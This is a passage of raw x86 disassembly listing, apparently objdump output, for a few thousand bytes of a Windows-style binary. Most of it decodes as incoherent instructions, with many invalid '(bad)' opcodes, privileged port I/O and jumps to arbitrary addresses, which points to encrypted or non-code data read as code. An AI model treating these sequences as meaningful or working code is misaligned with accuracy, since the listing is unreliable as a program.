  40b9af:	or     DWORD PTR [edx],0xffffffdb
  40b9b2:	clc    
  40b9b3:	or     al,0x11
  40b9b5:	js     0x40ba0a
  40b9b7:	daa    
  40b9b8:	sbb    cl,cl
  40b9ba:	mov    al,0x45
  40b9bc:	mov    edi,0xa6c6ca8d
  40b9c1:	mov    bh,0x5c
  40b9c3:	les    edx,FWORD PTR [eax]
  40b9c5:	push   ds
  40b9c6:	test   BYTE PTR [eax+0x58827df3],dl
  40b9cc:	cwde   
  40b9cd:	mov    ds:0x20bb0f99,eax
  40b9d2:	add    DWORD PTR [esi+eiz*2-0x7],esi
  40b9d6:	test   ebx,eax
  40b9d8:	clc    
  40b9d9:	das    
  40b9da:	iret   
  40b9db:	sbb    BYTE PTR ds:0xc1f4b0cd,dh
  40b9e1:	dec    ecx
  40b9e2:	repnz int3 
  40b9e4:	sti    
  40b9e5:	pop    ds
  40b9e6:	push   ss
  40b9e7:	nop
  40b9e8:	retf   0x5ad7
  40b9eb:	cmp    eax,0xbf3a632f
  40b9f0:	(bad)  
  40b9f1:	mov    DWORD PTR [ecx-0x63],0x74dac202
  40b9f8:	jo     0x40b98d
  40b9fa:	dec    ebp
  40b9fb:	aam    0x1
  40b9fd:	cwde   
  40b9fe:	ins    DWORD PTR es:[edi],dx
  40b9ff:	ret    
  40ba00:	out    dx,eax
  40ba01:	push   eax
  40ba02:	push   ebp
  40ba03:	(bad)  
  40ba04:	push   ebx
  40ba05:	xchg   BYTE PTR [ebp+0x10],al
  40ba08:	scas   eax,DWORD PTR es:[edi]
  40ba09:	loop   0x40ba16
  40ba0b:	fstp   QWORD PTR [ecx+eiz*8+0x21]
  40ba0f:	sbb    eax,0x140cc7d3
  40ba14:	and    eax,0x3acde016
  40ba19:	push   ecx
  40ba1a:	lds    edi,FWORD PTR [esi+0x58]
  40ba1d:	out    0x5f,eax
  40ba1f:	fstp   DWORD PTR [eax-0xe]
  40ba22:	test   dl,bh
  40ba24:	dec    edi
  40ba25:	xlat   BYTE PTR ds:[ebx]
  40ba26:	or     BYTE PTR [edi+0x34],dh
  40ba29:	cdq    
  40ba2a:	(bad)  
  40ba2c:	and    al,0xc0
  40ba2e:	and    al,0x40
  40ba30:	jge    0x40b9c4
  40ba32:	sub    edx,DWORD PTR [edi+eiz*8]
  40ba35:	xor    eax,DWORD PTR [ebx+0x2db135e3]
  40ba3b:	int3   
  40ba3c:	add    ebp,DWORD PTR [edi]
  40ba3e:	popa   
  40ba3f:	daa    
  40ba40:	mov    ebx,DWORD PTR [eax]
  40ba42:	xchg   BYTE PTR [eax+ebp*2-0x68],al
  40ba46:	fstp   TBYTE PTR [edx]
  40ba48:	xchg   BYTE PTR [edx+0x6886aabe],cl
  40ba4e:	sub    BYTE PTR [ecx],0x14
  40ba51:	mov    bl,BYTE PTR [edi-0x6e693233]
  40ba57:	push   esi
  40ba58:	push   edi
  40ba59:	int    0x4f
  40ba5b:	test   BYTE PTR [edx+0x12524060],0x14
  40ba62:	or     al,0x10
  40ba64:	cmp    eax,0xf6efcc6c
  40ba69:	jp     0x40ba3c
  40ba6b:	inc    ebp
  40ba6c:	enter  0xdcaf,0xc3
  40ba70:	mov    esp,0x80912b63
  40ba75:	icebp  
  40ba76:	mov    ecx,ebx
  40ba78:	or     bh,bh
  40ba7a:	retf   0x2fa4
  40ba7d:	jne    0x40ba8b
  40ba7f:	loopne 0x40baba
  40ba81:	es mov ch,ch
  40ba84:	push   esi
  40ba85:	pop    es
  40ba86:	sub    eax,DWORD PTR ds:0xc52af482
  40ba8c:	cdq    
  40ba8d:	add    esp,ebp
  40ba8f:	sub    BYTE PTR [edi-0x57],al
  40ba92:	jo     0x40bac4
  40ba94:	(bad)
  40ba97:	jle    0x40bab1
  40ba99:	xchg   ecx,eax
  40ba9a:	mov    ch,0x30
  40ba9c:	sub    al,0x15
  40ba9e:	dec    ebp
  40ba9f:	jmp    0xd4ba6b61
  40baa4:	cld    
  40baa5:	in     al,0x58
  40baa7:	push   edi
  40baa8:	pop    ds
  40baa9:	add    BYTE PTR [edi],0x8e
  40baac:	add    ebp,DWORD PTR [ecx+0x7a906f0c]
  40bab2:	clc    
  40bab3:	or     dh,BYTE PTR [edi]
  40bab5:	cmp    al,0xc5
  40bab7:	pop    ebx
  40bab8:	cmp    DWORD PTR ds:0x1e4a2370,0xdbab80d
  40bac2:	pop    ebx
  40bac3:	bound  ebx,QWORD PTR [edi+eax*2+0x21]
  40bac7:	dec    esi
  40bac8:	hlt    
  40bac9:	or     ebp,eax
  40bacb:	fs es jl 0x40ba77
  40bacf:	add    bl,BYTE PTR [ebx-0x11]
  40bad2:	jg     0x40ba9c
  40bad4:	mov    ch,0x43
  40bad6:	push   esi
  40bad7:	add    bl,BYTE PTR ds:0x712a7d23
  40badd:	ret    0xeee6
  40bae0:	dec    edx
  40bae1:	jg     0x40baef
  40bae3:	cmp    al,0xd
  40bae5:	fisubr WORD PTR [ecx]
  40bae7:	jp     0x40bb0d
  40bae9:	fsubrp st(6),st
  40baeb:	das    
  40baec:	rcl    dh,0x75
  40baef:	ins    DWORD PTR es:[edi],dx
  40baf0:	cld    
  40baf1:	sbb    eax,0x7baf529
  40baf6:	stc    
  40baf7:	or     al,0x4b
  40baf9:	push   ss
  40bafa:	pop    edx
  40bafb:	test   BYTE PTR [eax-0x1b4b47f0],dh
  40bb01:	xchg   edx,eax
  40bb02:	aas    
  40bb03:	jmp    0xa090:0xa8e3ba73
  40bb0a:	xchg   edi,eax
  40bb0b:	jno    0x40bb43
  40bb0d:	test   DWORD PTR [edi],esi
  40bb0f:	lock int 0xab
  40bb12:	jmp    FWORD PTR [ecx+0x4c]
  40bb15:	or     eax,0x14b15f3e
  40bb1a:	jge    0x40bb94
  40bb1c:	neg    DWORD PTR [eax-0x108d0854]
  40bb22:	pop    ecx
  40bb23:	sub    eax,DWORD PTR ds:0x5d765e8a
  40bb29:	retf   0x98b6
  40bb2c:	bt     DWORD PTR [eax-0x4c],ebx
  40bb30:	xor    al,0x4f
  40bb32:	inc    edi
  40bb33:	jmp    0x2657:0x36df2085
  40bb3a:	cdq    
  40bb3b:	xor    al,dl
  40bb3d:	test   al,0x5c
  40bb3f:	push   cs
  40bb40:	daa    
  40bb41:	mov    ds:0x646593ec,al
  40bb46:	mov    dh,0xb5
  40bb48:	call   0x8bda:0xa878de87
  40bb4f:	xchg   esp,eax
  40bb50:	dec    ebx
  40bb51:	rol    BYTE PTR [eax-0x78722e7b],1
  40bb57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb58:	dec    ecx
  40bb59:	jle    0x40bb3c
  40bb5b:	mov    edx,0xc81c2102
  40bb60:	cli    
  40bb61:	je     0x40baf2
  40bb63:	int    0x9b
  40bb65:	xor    bl,BYTE PTR [ebx+ebx*4+0x66]
  40bb69:	or     eax,DWORD PTR [edx-0x5a0b42a7]
  40bb6f:	fisubr DWORD PTR [edi-0x57]
  40bb72:	mov    al,0x6
  40bb74:	test   dl,bl
  40bb76:	nop
  40bb77:	xchg   DWORD PTR [edx-0x1c2d8beb],edi
  40bb7d:	out    dx,al
  40bb7e:	leave  
  40bb7f:	cmc    
  40bb80:	stc    
  40bb81:	mov    eax,ds:0x75fdb14a
  40bb86:	sbb    DWORD PTR [edi*8+0x6c3cd3f3],ebp
  40bb8d:	test   eax,0x4e1028e
  40bb92:	inc    ebx
  40bb93:	fnstcw WORD PTR [edx-0x7a]
  40bb96:	cmp    eax,0xaa08e16e
  40bb9b:	prefetch (bad)
  40bb9c:	or     eax,0x24304ee8
  40bba1:	adc    ebp,DWORD PTR [ebp-0x64adfc52]
  40bba7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bba8:	dec    esi
  40bba9:	inc    edi
  40bbaa:	sub    BYTE PTR [edi-0x26],bl
  40bbad:	test   BYTE PTR [ebx],ah
  40bbaf:	xchg   esi,eax
  40bbb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbb1:	ss and al,dl
  40bbb4:	mov    bh,0x1e
  40bbb6:	xor    BYTE PTR [esi+0x29],al
  40bbb9:	test   DWORD PTR [edx-0x40c081f6],ebp
  40bbbf:	adc    DWORD PTR [ebx+0x6a221987],0x774ab0f2
  40bbc9:	xor    BYTE PTR [ecx-0x43acfb78],dl
  40bbcf:	popf   
  40bbd0:	mov    WORD PTR ds:0xe7b0056b,?
  40bbd6:	clc    
  40bbd7:	dec    ebp
  40bbd8:	mov    al,0x87
  40bbda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbdb:	icebp  
  40bbdc:	leave  
  40bbdd:	cwde   
  40bbde:	sub    DWORD PTR [eax+0xf],eax
  40bbe1:	push   edi
  40bbe2:	pop    ds
  40bbe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbe4:	add    DWORD PTR [ebp+0x2a],esi
  40bbe7:	data16 fdiv st(7),st
  40bbea:	loop   0x40bc5b
  40bbec:	and    DWORD PTR [ebp+0x789e2f6b],ecx
  40bbf2:	cdq    
  40bbf3:	sub    BYTE PTR [esi+0x24],bl
  40bbf6:	outs   dx,BYTE PTR ds:[esi]
  40bbf7:	inc    edi
  40bbf8:	or     eax,0x82072931
  40bbfd:	xchg   BYTE PTR [edx],bl
  40bbff:	repz les esp,FWORD PTR [ebx+ecx*2-0x1c]
  40bc04:	push   esp
  40bc05:	sub    DWORD PTR [ecx-0x6a00e713],eax
  40bc0b:	mov    ebx,0x866a9632
  40bc10:	fadd   DWORD PTR [ecx+0x59]
  40bc13:	loopne 0x40bbfc
  40bc15:	dec    esi
  40bc16:	outs   dx,DWORD PTR ds:[esi]
  40bc17:	or     BYTE PTR ds:[eax+eiz*8+0x43509937],bl
  40bc1f:	sub    eax,edx
  40bc21:	or     ebp,DWORD PTR [ebp-0x7c]
  40bc24:	push   ebx
  40bc25:	hlt    
  40bc26:	xchg   ebx,eax
  40bc27:	gs xchg ecx,eax
  40bc29:	in     eax,dx
  40bc2a:	ja     0x40bc19
  40bc2c:	pop    edx
  40bc2d:	mov    bl,0x81
  40bc2f:	or     eax,0x3f75aad1
  40bc34:	pop    ecx
  40bc35:	push   eax
  40bc36:	mov    gs,WORD PTR [edi]
  40bc38:	mov    esi,0x6c69feb4
  40bc3d:	clc    
  40bc3e:	sti    
  40bc3f:	daa    
  40bc40:	sti    
  40bc41:	push   edx
  40bc42:	cdq    
  40bc43:	in     al,0xf7
  40bc45:	and    al,ah
  40bc47:	aaa    
  40bc48:	cmp    eax,0x3e5b0b52
  40bc4d:	jae    0x40bbee
  40bc4f:	inc    DWORD PTR [eax+0x205c197c]
  40bc55:	dec    edx
  40bc56:	mov    cl,BYTE PTR [esi+esi*8]
  40bc59:	loopne 0x40bc1d
  40bc5b:	nop
  40bc5c:	aam    0xeb
  40bc5e:	inc    esp
  40bc5f:	push   edx
  40bc60:	xor    eax,0xae94ff21
  40bc65:	adc    bl,0x38
  40bc68:	push   eax
  40bc69:	sub    esi,DWORD PTR [edx-0x6a]
  40bc6c:	and    eax,0x54824b96
  40bc71:	or     DWORD PTR [edi+0xe7c69db],0xd26e933a
  40bc7b:	mov    al,ds:0x4b3c17dc
  40bc80:	nop
  40bc81:	adc    eax,0xe9e1159e
  40bc86:	mov    dl,BYTE PTR [eax-0x5b1325a7]
  40bc8c:	imul   ebx,ebp,0xe1fa9e99
  40bc92:	mov    ah,0xd2
  40bc94:	xchg   ebx,eax
  40bc95:	out    0x3a,al
  40bc97:	popf   
  40bc98:	adc    eax,0xb49110fa
  40bc9d:	jbe    0x40bcc0
  40bc9f:	mov    cl,0xda
  40bca1:	dec    ebp
  40bca2:	inc    edi
  40bca3:	int    0x82
  40bca5:	cmp    al,0xe3
  40bca7:	pushf  
  40bca8:	pop    ebp
  40bca9:	cmp    ebp,DWORD PTR [ebx]
  40bcab:	fistp  QWORD PTR [ebx]
  40bcad:	fimul  DWORD PTR [ebx-0x79f037ab]
  40bcb3:	add    eax,DWORD PTR [eax]
  40bcb5:	add    BYTE PTR [eax],al
  40bcb7:	mov    edx,DWORD PTR [ebp-0x3c]
  40bcba:	mov    edi,DWORD PTR [ebp-0x4]
  40bcbd:	xor    edi,eax
  40bcbf:	xor    edx,eax
  40bcc1:	jmp    0x40c0d8
  40bcc6:	test   DWORD PTR [ebp-0x48],ecx
  40bcc9:	rol    BYTE PTR [eax-0x33],0x8d
  40bccd:	dec    ebp
  40bcce:	pop    ecx
  40bccf:	repz ror ebx,cl
  40bcd2:	mov    WORD PTR [esi],es
  40bcd4:	retf   0xe472
  40bcd7:	mov    ?,WORD PTR [esi+0x7e]
  40bcda:	jo     0x40bd55
  40bcdc:	jle    0x40bd5c
  40bcde:	test   al,0x2a
  40bce0:	or     dl,bh
  40bce2:	jg     0x40bd40
  40bce4:	push   edx
  40bce5:	jge    0x40bcd7
  40bce7:	ror    DWORD PTR [ebp-0x18b3013b],cl
  40bced:	popf   
  40bcee:	mov    al,0x3d
  40bcf0:	dec    ebp
  40bcf1:	adc    DWORD PTR [eax+0x2a69a595],esi
  40bcf7:	loopne 0x40bd4c
  40bcf9:	repnz xor dl,0x9a
  40bcfd:	xchg   esp,eax
  40bcff:	push   esi
  40bd00:	mov    edx,0xcda2860e
  40bd05:	sbb    DWORD PTR ds:0x59f26c9a,ebx
  40bd0b:	jg     0x40bd58
  40bd0d:	sar    DWORD PTR [eax-0x26],cl
  40bd10:	mov    al,0x6f
  40bd12:	in     al,0x18
  40bd14:	cmp    eax,0xcfe5f30d
  40bd19:	dec    edx
  40bd1a:	sti    
  40bd1b:	lods   al,BYTE PTR ds:[esi]
  40bd1c:	mov    ah,0x8e
  40bd1e:	cs clc 
  40bd20:	je     0x40bcb9
  40bd22:	xchg   ebp,eax
  40bd23:	sbb    al,0xc2
  40bd25:	add    eax,0x9138a50c
  40bd2a:	cmp    dl,BYTE PTR [ecx]
  40bd2c:	popf   
  40bd2d:	or     cl,BYTE PTR [edx+0x4c]
  40bd30:	and    ebp,DWORD PTR [ebx-0x20de72ea]
  40bd36:	retf   0x593e
  40bd39:	push   0x71
  40bd3b:	icebp  
  40bd3c:	sub    ch,BYTE PTR [edi]
  40bd3e:	(bad)  
  40bd3f:	fisttp QWORD PTR [esi-0x6ea4d1d2]
  40bd45:	sub    esp,DWORD PTR [eax-0x63]
  40bd48:	dec    edi
  40bd49:	or     BYTE PTR [edi+0x78],ch
  40bd4c:	test   BYTE PTR [ebp-0x5b],al
  40bd4f:	cmp    eax,eax
  40bd51:	mov    esi,0xc56e7485
  40bd56:	popa   
  40bd57:	lahf   
  40bd58:	scas   eax,DWORD PTR es:[edi]
  40bd59:	aaa    
  40bd5a:	mov    esi,0x33b27769
  40bd5f:	cwde   
  40bd60:	pextrw esi,(bad),0xc5
  40bd62:	jo     0x40bd74
  40bd64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd65:	xchg   ebx,eax
  40bd66:	je     0x40bde7
  40bd68:	and    al,0x1f
  40bd6a:	mov    al,0x86
  40bd6c:	cmp    DWORD PTR [edi],ebx
  40bd6e:	or     bl,BYTE PTR [ecx]
  40bd70:	data16 mov WORD PTR fs:0x8da56b10,ss
  40bd78:	retf   0x3ee9
  40bd7b:	dec    eax
  40bd7c:	aad    0xe3
  40bd7e:	test   al,0x4a
  40bd80:	hlt    
  40bd81:	push   ss
  40bd82:	fcom   QWORD PTR [edi-0x4c58ebe]
  40bd88:	cmp    DWORD PTR [esi+ebx*8],eax
  40bd8b:	xor    DWORD PTR [edx-0x6a061ea8],0xffffffd9
  40bd92:	or     BYTE PTR [edi+0x61c876bc],0xcf
  40bd99:	sahf   
  40bd9a:	cli    
  40bd9b:	iret   
  40bd9c:	out    0x74,al
  40bd9e:	jp     0x40bd62
  40bda0:	xor    eax,DWORD PTR [eax-0x26]
  40bda3:	ss xchg ecx,eax
  40bda5:	repnz inc eax
  40bda7:	rol    DWORD PTR [eax-0x4e0ca140],0x70
  40bdae:	ins    DWORD PTR es:[edi],dx
  40bdaf:	sub    edx,edx
  40bdb1:	pop    esi
  40bdb2:	mov    bh,0x89
  40bdb4:	(bad)  
  40bdb5:	cwde   
  40bdb6:	add    DWORD PTR [ebp+0x47],ebx
  40bdb9:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40bdbb:	cmp    BYTE PTR [edx],dh
  40bdbd:	push   0xbcd79d34
  40bdc2:	push   cs
  40bdc3:	arpl   bp,bp
  40bdc5:	inc    edx
  40bdc6:	(bad)  [eax-0x5922839]
  40bdcc:	test   eax,0xfb856e79
  40bdd1:	test   BYTE PTR [ecx+0x18b95c22],dh
  40bdd7:	test   DWORD PTR [ebx+0x34],edx
  40bdda:	jle    0x40bd5e
  40bddc:	xlat   BYTE PTR ds:[ebx]
  40bddd:	fmul   QWORD PTR [ebx*1+0x2902784d]
  40bde4:	aas    
  40bde5:	pop    ebp
  40bde6:	call   0xed0e6e52
  40bdeb:	das    
  40bdec:	mov    ds:0x866d062e,eax
  40bdf1:	mov    ds:0xd7eaa9b6,eax
  40bdf6:	jg     0x40be28
  40bdf8:	inc    esi
  40bdf9:	ja     0x40be63
  40bdfb:	sbb    eax,0xd05fd2e6
  40be00:	pop    ebp
  40be01:	adc    dh,dh
  40be03:	xchg   bl,dl
  40be05:	sub    cl,BYTE PTR [eax]
  40be07:	repnz retf 0xee1c
  40be0b:	sbb    eax,0x587d543a
  40be10:	dec    edi
  40be11:	add    DWORD PTR [eiz*8+0x44b805d6],edi
  40be18:	stc    
  40be19:	and    ch,al
  40be1b:	mov    ecx,DWORD PTR [eax]
  40be1d:	mov    eax,ds:0x31292934
  40be22:	cmp    al,0x8f
  40be24:	popa   
  40be25:	(bad)  [ebx+edx*4]
  40be28:	pop    es
  40be29:	mov    dl,0x86
  40be2b:	mov    bh,0xf0
  40be2d:	cmp    esp,edx
  40be2f:	xor    esp,esp
  40be31:	(bad)  
  40be32:	out    dx,eax
  40be33:	xchg   BYTE PTR [edx-0x43],ch
  40be36:	std    
  40be37:	push   ebx
  40be38:	fdivp  st(7),st
  40be3a:	shr    DWORD PTR [edi],1
  40be3c:	aam    0x64
  40be3e:	pop    esp
  40be3f:	lds    ecx,FWORD PTR [edi]
  40be41:	adc    DWORD PTR [edx-0x13b290cb],ebp
  40be47:	mov    DWORD PTR [esi+0x18095b73],edi
  40be4d:	ret    0x5afa
  40be50:	inc    esi
  40be51:	push   eax
  40be52:	dec    ecx
  40be53:	or     bh,BYTE PTR ds:0xf464c838
  40be59:	scas   al,BYTE PTR es:[edi]
  40be5a:	mov    ebp,0xfcd42d3e
  40be5f:	mov    dh,BYTE PTR [edi+esi*2-0x35]
  40be63:	jmp    0x8e70e5f4
  40be68:	js     0x40bdfc
  40be6a:	gs mov dh,0xd5
  40be6d:	fld    QWORD PTR [edi+0x51]
  40be70:	mov    ebp,0xe0074457
  40be75:	out    dx,al
  40be76:	mov    ecx,0xcfaaf11c
  40be7b:	inc    ebx
  40be7c:	mov    ebx,0xd43ec590
  40be81:	fwait
  40be82:	out    0x3b,eax
  40be84:	(bad)  
  40be85:	stos   DWORD PTR es:[edi],eax
  40be86:	sub    eax,0x18824fb8
  40be8b:	in     al,0xaf
  40be8d:	xchg   dl,ch
  40be8f:	das    
  40be90:	call   0x97998cb8
  40be95:	in     eax,0x50
  40be97:	add    bh,bl
  40be99:	inc    ebp
  40be9a:	mov    ds:0xfcf71233,eax
  40be9f:	mov    edi,0xd32012e8
  40bea4:	add    BYTE PTR [ebx-0x42],dl
  40bea7:	pushf  
  40bea8:	xchg   ecx,eax
  40bea9:	dec    ebp
  40beaa:	xchg   ebp,eax
  40beab:	cdq    
  40beac:	mov    al,0xf3
  40beae:	fwait
  40beaf:	pop    ebp
  40beb0:	add    DWORD PTR [edi],0x7d
  40beb3:	xor    dl,al
  40beb5:	push   0x2307bd49
  40beba:	xchg   ebp,eax
  40bebb:	inc    ebx
  40bebc:	or     esi,DWORD PTR [esi+0x740993e6]
  40bec2:	push   ebx
  40bec3:	imul   ebx,DWORD PTR [edx],0xf98422f1
  40bec9:	call   0x47d179e2
  40bece:	inc    edi
  40becf:	mov    ds:0xe9db0160,al
  40bed4:	inc    DWORD PTR [ecx+0x57]
  40bed7:	and    eax,0x3d024ec8
  40bedc:	push   ebp
  40bedd:	jmp    0x40be8e
  40bedf:	aas    
  40bee0:	out    0x48,eax
  40bee2:	pop    esp
  40bee3:	dec    ebx
  40bee4:	add    BYTE PTR [eax-0x66],dh
  40bee7:	or     edx,edi
  40bee9:	iret   
  40beea:	aad    0x8e
  40beec:	add    al,BYTE PTR [esi]
  40beee:	push   eax
  40beef:	jmp    0xbee5:0xb249d97d
  40bef6:	jae    0x40beed
  40bef8:	cli    
  40bef9:	and    BYTE PTR [esi+0x3d],ch
  40befc:	push   0x78c14c46
  40bf01:	lea    esp,[esi+0x39]
  40bf04:	and    ecx,esp
  40bf06:	pop    es
  40bf07:	inc    edi
  40bf08:	leave  
  40bf09:	outs   dx,DWORD PTR ds:[esi]
  40bf0a:	dec    edi
  40bf0b:	retf   0xd09e
  40bf0e:	xchg   edi,eax
  40bf0f:	pop    edi
  40bf10:	push   edi
  40bf11:	std    
  40bf12:	aad    0x4
  40bf14:	stc    
  40bf15:	jne    0x40bf28
  40bf17:	js     0x40beca
  40bf19:	sbb    BYTE PTR [eax],al
  40bf1b:	or     BYTE PTR [edi],dl
  40bf1d:	sbb    DWORD PTR [eax],ebp
  40bf1f:	add    ch,BYTE PTR [eax-0x4c]
  40bf22:	xchg   edx,eax
  40bf23:	ret    0xb986
  40bf26:	sub    ebp,edi
  40bf28:	lods   al,BYTE PTR ds:[esi]
  40bf29:	int3   
  40bf2a:	rcl    BYTE PTR [ebp+0x10232145],cl
  40bf30:	pop    ds
  40bf31:	jo     0x40bf1d
  40bf33:	pop    ds
  40bf34:	out    dx,al
  40bf35:	hlt    
  40bf36:	xchg   ebp,edi
  40bf38:	inc    esi
  40bf39:	inc    ebx
  40bf3a:	inc    ebx
  40bf3b:	mov    cl,0xf8
  40bf3d:	push   es
  40bf3e:	mov    es,WORD PTR [esi]
  40bf40:	jne    0x40bf7e
  40bf42:	scas   eax,DWORD PTR es:[edi]
  40bf43:	call   0x988:0xaa5565cf
  40bf4a:	cs stc 
  40bf4c:	add    al,0x2e
  40bf4e:	push   cs
  40bf4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf50:	jo     0x40bee1
  40bf52:	shl    DWORD PTR [ecx-0x13],cl
  40bf55:	hlt    
  40bf56:	push   ebx
  40bf57:	(bad)  
  40bf58:	repnz pop DWORD PTR [ebx]
  40bf5b:	add    eax,0x7369691e
  40bf60:	nop
  40bf61:	out    dx,al
  40bf62:	mov    ds:0xf6e8e51c,al
  40bf67:	cmp    ah,BYTE PTR [eax+ebx*2]
  40bf6a:	hlt    
  40bf6b:	jecxz  0x40bfaa
  40bf6d:	jb     0x40bfae
  40bf6f:	add    al,0x2f
  40bf71:	aas    
  40bf72:	test   al,0xb9
  40bf74:	jle    0x40bfaf
  40bf76:	sahf   
  40bf77:	jbe    0x40bf7c
  40bf79:	ins    BYTE PTR es:[edi],dx
  40bf7a:	mov    dh,dl
  40bf7c:	test   DWORD PTR [ebx],esi
  40bf7e:	shr    DWORD PTR [ebp+0x3ac6e0a0],0x56
  40bf85:	xor    BYTE PTR [esi],dh
  40bf87:	cmp    al,ah
  40bf89:	jmp    0x40bf1c
  40bf8b:	inc    esi
  40bf8c:	add    DWORD PTR [edx-0x6f2dd8b1],ebp
  40bf92:	push   cs
  40bf93:	mov    bl,0x8a
  40bf95:	adc    edi,DWORD PTR [ecx-0xc]
  40bf98:	inc    esi
  40bf99:	(bad)  
  40bf9a:	aas    
  40bf9b:	mov    esi,0x923c02b3
  40bfa0:	xchg   esi,eax
  40bfa1:	out    dx,eax
  40bfa2:	dec    ebp
  40bfa3:	loop   0x40c009
  40bfa5:	mov    edi,0xb2d143e9
  40bfaa:	int    0xcf
  40bfac:	xor    BYTE PTR [eax-0x24],dh
  40bfaf:	lock mov ds:0x4089164b,eax
  40bfb5:	jnp    0x40bf91
  40bfb7:	xor    DWORD PTR [ebp+0x72],0x3a
  40bfbb:	push   ecx
  40bfbc:	in     al,0x63
  40bfbe:	sub    eax,0xaa6a10f4
  40bfc3:	push   es
  40bfc4:	arpl   WORD PTR [ecx],di
  40bfc6:	push   esp
  40bfc7:	in     eax,dx
  40bfc8:	test   dl,ch
  40bfca:	ret    
  40bfcb:	or     al,0xe
  40bfcd:	lods   eax,DWORD PTR ds:[esi]
  40bfce:	pop    esi
  40bfcf:	mov    ecx,0x21dfe4e4
  40bfd4:	das    
  40bfd5:	xchg   esi,eax
  40bfd6:	dec    edx
  40bfd7:	mov    dl,0x6f
  40bfd9:	aas    
  40bfda:	jmp    0x5281:0x8c6e5bce
  40bfe1:	cld    
  40bfe2:	sub    esp,DWORD PTR [eax]
  40bfe4:	jbe    0x40bf8b
  40bfe6:	(bad)  
  40bfe7:	pshufw mm5,QWORD PTR [ecx-0x1943a4ff],0x43
  40bfef:	cwde   
  40bff0:	dec    eax
  40bff1:	inc    esi
  40bff2:	call   0xddc74047
  40bff7:	sbb    al,0x69
  40bff9:	out    0xaa,al
  40bffb:	rcl    DWORD PTR ds:0xa2705bb7,cl
  40c001:	cdq    
  40c002:	mov    dl,0x27
  40c004:	bound  ebp,QWORD PTR [edi]
  40c006:	pop    edi
  40c007:	rcr    BYTE PTR [ecx+0x5424a4bb],1
  40c00d:	mov    eax,gs
  40c00f:	mov    bh,0x16
  40c011:	push   ebp
  40c012:	pop    ss
  40c013:	mov    DWORD PTR ds:0x4fade4f6,edi
  40c019:	fdivr  DWORD PTR [ebp+0x58471e32]
  40c01f:	or     ebx,DWORD PTR [edx+0x31e436ff]
  40c025:	pop    es
  40c026:	mov    ebx,0x1dd9297b
  40c02b:	clc    
  40c02c:	ds push esi
  40c02e:	mov    ebx,0x4747d0f0
  40c033:	aam    0x12
  40c035:	jp     0x40c027
  40c037:	mov    dh,0x8a
  40c039:	sub    al,0x79
  40c03b:	dec    esp
  40c03c:	cs ja  0x40c096
  40c03f:	lock (bad) 
  40c041:	mov    eax,ds:0xd4a5bc48
  40c046:	ds imul ebp,DWORD PTR cs:[esi],0xed90e255
  40c04e:	or     BYTE PTR [ecx],ah
  40c050:	scas   al,BYTE PTR es:[edi]
  40c051:	lahf   
  40c052:	jb     0x40c0d3
  40c054:	xchg   ecx,ecx
  40c056:	fdiv   DWORD PTR [ebp+0x144fd223]
  40c05c:	in     eax,dx
  40c05d:	xchg   DWORD PTR [edi+0x4c],edx
  40c060:	jmp    eax
  40c062:	(bad)  
  40c063:	int3   
  40c064:	test   ch,bh
  40c066:	push   eax
  40c067:	in     eax,dx
  40c068:	mov    bl,0x92
  40c06a:	and    al,0x90
  40c06c:	shl    DWORD PTR [edi+0x26],cl
  40c06f:	dec    esi
  40c070:	add    eax,0x59d74058
  40c075:	aad    0xa
  40c077:	push   eax
  40c078:	sub    al,0x36
  40c07a:	xor    DWORD PTR [esi-0x11ff958e],edx
  40c080:	gs jne 0x40c0c1
  40c083:	ds add al,0x28
  40c086:	ret    0x9f6c
  40c089:	mov    bh,bh
  40c08b:	sbb    ah,BYTE PTR [eax+esi*4-0xf45ed3c]
  40c092:	bound  edi,QWORD PTR [ebx]
  40c094:	rcr    DWORD PTR [ecx-0xd],0x21
  40c098:	adc    DWORD PTR [esi+0x4b],ebx
  40c09b:	and    al,0x9a
  40c09d:	or     al,0x1c
  40c09f:	call   0x5c11f5bd
  40c0a4:	jnp    0x40c0f4
  40c0a6:	scas   al,BYTE PTR es:[edi]
  40c0a7:	lods   eax,DWORD PTR ds:[esi]
  40c0a8:	sbb    eax,0x7ad37126
  40c0ad:	cmp    edi,DWORD PTR [ecx-0x4b718a8c]
  40c0b3:	pop    es
  40c0b4:	push   ebp
  40c0b5:	mov    ds:0x6671e016,al
  40c0ba:	mov    cl,0x30
  40c0bc:	je     0x40c0e0
  40c0be:	mov    ah,0xb7
  40c0c0:	cmp    ebx,edx
  40c0c2:	xor    eax,0xa84755
  40c0c7:	shl    BYTE PTR [eax-0x202eb23a],cl
  40c0cd:	sub    al,0x58
  40c0cf:	clc    
  40c0d0:	inc    edx
  40c0d1:	out    0x91,eax
  40c0d3:	adc    BYTE PTR [edi+ecx*2-0x6fcca66],0x3
  40c0db:	shr    ecx,1
  40c0dd:	adc    al,BYTE PTR [eax+eax*1]
  40c0e0:	add    BYTE PTR ds:0x7dcf74e8,bh
  40c0e6:	dec    ebx
  40c0e7:	mov    ebp,0xd527fffc
  40c0ec:	rcr    BYTE PTR [eax+0x41],1
  40c0ef:	test   DWORD PTR [ebp+0x7e7e8ade],ebx
  40c0f5:	jo     0x40c170
  40c0f7:	jle    0x40c177
  40c0f9:	fs stos DWORD PTR es:[edi],eax
  40c0fb:	sub    al,0x48
  40c0fd:	es jmp 0x725b:0x6f5a9649
  40c105:	inc    ecx
  40c106:	aam    0xc7
  40c108:	inc    esi
  40c109:	(bad)  
  40c10a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c10b:	xchg   DWORD PTR [ebx],edx
  40c10d:	sbb    ah,BYTE PTR ds:0xe5064260
  40c113:	and    eax,0xd388074f
  40c118:	in     eax,0xf0
  40c11a:	push   ebp
  40c11b:	inc    esi
  40c11c:	fcom   QWORD PTR [edi]
  40c11e:	(bad)  
  40c11f:	js     0x40c121
  40c121:	sbb    bh,BYTE PTR [edi+0x45]
  40c124:	dec    eax
  40c125:	and    eax,0x9352a270
  40c12a:	aaa    
  40c12b:	imul   ebp,DWORD PTR [edi-0x256c3a15],0xffffffb7
  40c132:	das    
